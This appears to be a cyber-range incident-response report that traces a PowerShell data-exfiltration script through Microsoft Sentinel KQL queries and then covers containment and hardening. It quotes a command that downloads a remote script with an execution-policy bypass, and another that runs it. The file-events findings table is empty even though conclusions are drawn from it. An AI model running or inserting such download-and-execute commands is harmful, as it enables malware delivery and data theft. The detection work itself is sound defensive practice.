## Detection and Analysis

### Initial Alert

The investigation began with an alert from Microsoft Sentinel for the rule "Detect Web-Request from Powershell.exe - PN". The alert triggered based on the following query:

```kql
DeviceProcessEvents
| where DeviceName == "ir-win10"
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| order by TimeGenerated
```

This query detected the following suspicious command:
```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
```

The command indicated that a PowerShell script (`exfiltratedata.ps1`) was downloaded from the internet to `C:\programdata`. This triggered further investigation.

### User Inquiry

I contacted the user of `ir-win10` to gather additional context. The user mentioned they attempted to install something, observed a black screen, and stated "nothing happened afterward." This information suggested the possibility of a malicious script being executed without their knowledge.

### Query 1: Process Events

To confirm whether the downloaded script was executed, I queried process events:
```kql
DeviceProcessEvents
| where DeviceName == "ir-win10"
| where InitiatingProcessCommandLine contains "exfiltratedata.ps1"
| project Timestamp, FileName, FolderPath, ProcessCommandLine
```
![_ir2](https://github.com/user-attachments/assets/8c377af9-291d-4c76-b71f-cf8ed5f9e37a)


**Findings:**
| Timestamp          | FileName         | FolderPath                                  | ProcessCommandLine                                        |
|--------------------|------------------|--------------------------------------------|---------------------------------------------------------|
| 8 Jan 2025 18:48:38 | powershell.exe  | C:\Windows\System32\WindowsPowerShell\v1.0\ | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 |

This confirmed the script was executed shortly after it was downloaded. 

### Query 2: Repeat Execution Detected

To investigate further, I re-ran the query to check for subsequent activity involving the same script. A second execution was detected:

![_ir3](https://github.com/user-attachments/assets/81af8306-52d5-4e37-ac87-e1066ea1958e)


| Timestamp          | FileName         | FolderPath                                  | ProcessCommandLine                                        |
|--------------------|------------------|--------------------------------------------|---------------------------------------------------------|
| 8 Jan 2025 19:48:27 | powershell.exe  | C:\Windows\System32\WindowsPowerShell\v1.0\ | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 |

This indicated ongoing malicious activity and elevated the incident to a live attack scenario.

### Query 3: Network Events

I analyzed network events to identify any potential data exfiltration:
```kql
DeviceNetworkEvents
| where DeviceName == "ir-win10"
| where InitiatingProcessCommandLine contains "exfiltratedata.ps1"
| project Timestamp, ActionType, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessCommandLine
| order by Timestamp
```
![_ir4](https://github.com/user-attachments/assets/1832d285-87de-4539-a3a4-a853e4018ab2)


**Findings:**
| Timestamp          | ActionType       | RemoteIP          | RemotePort | RemoteUrl                                      | CommandLine                                           |
|--------------------|------------------|-------------------|------------|------------------------------------------------|-----------------------------------------------------|
| 8 Jan 2025 18:48:35 | ConnectionSuccess | 185.199.109.133   | 443        | https://raw.githubusercontent.com              | powershell.exe -ExecutionPolicy Bypass -Command ... |
| 8 Jan 2025 18:48:39 | ConnectionSuccess | 20.60.181.193     | 443        | https://sacyberrange00.blob.core.windows.net    | powershell.exe -ExecutionPolicy Bypass -File ...    |
| 8 Jan 2025 19:48:47 | ConnectionSuccess | 20.60.133.132     | 443        | https://sacyberrangedanger.blob.core.windows.net| powershell.exe -ExecutionPolicy Bypass -File ...    |

The findings showed active connections to potentially malicious endpoints, further substantiating the threat.

### Query 4: File Events

To identify artifacts, I queried file events:
```kql
DeviceFileEvents
| where DeviceName == "ir-win10"
| where FileName endswith ".zip"
| project Timestamp, FileName, FolderPath, InitiatingProcessCommandLine, ActionType
| order by Timestamp desc
```
![_ir5](https://github.com/user-attachments/assets/ef546c84-dab4-4d97-8680-02376498574f)


**Findings:**
| Timestamp          | FileName                     | FolderPath                             | InitiatingProcessCommandLine                                          | ActionType |
|--------------------|------------------------------|----------------------------------------|------------------------------------------------------------------------|------------|

The repeated file creation and renaming strongly suggested data staging and preparation for exfiltration.

## Containment, Eradication, and Recovery

### Immediate Containment

1. **Quarantine Affected Device**:
   - Disconnected `ir-win10` from the network.

2. **Block Malicious IPs and URLs**:
   - Blocked the following IPs and domains in the firewall:
     - 185.199.109.133
     - 20.60.181.193
     - 20.60.133.132
     - https://raw.githubusercontent.com
     - https://sacyberrange00.blob.core.windows.net
     - https://sacyberrangedanger.blob.core.windows.net

### Investigation and Remediation

1. **Locate and Delete Malicious Artifacts**:
   - Removed all instances of `exfiltratedata.ps1` from `C:\programdata`.
   - Deleted any related ZIP files (e.g., `employee-data-*.zip`) and temporary files.

2. **Scan the System**:
   - Performed a full system scan using Microsoft Defender for Endpoint.
   - Used Windows Defender Offline for deeper inspection.

3. **Analyze Network Traffic**:
   - Inspected logs to confirm no sensitive data was exfiltrated.

4. **Harden Endpoint Security**:
   - Disabled PowerShell for non-administrative users.
   - Enforced stricter PowerShell execution policies.
   - Implemented application whitelisting to block unauthorized executables.
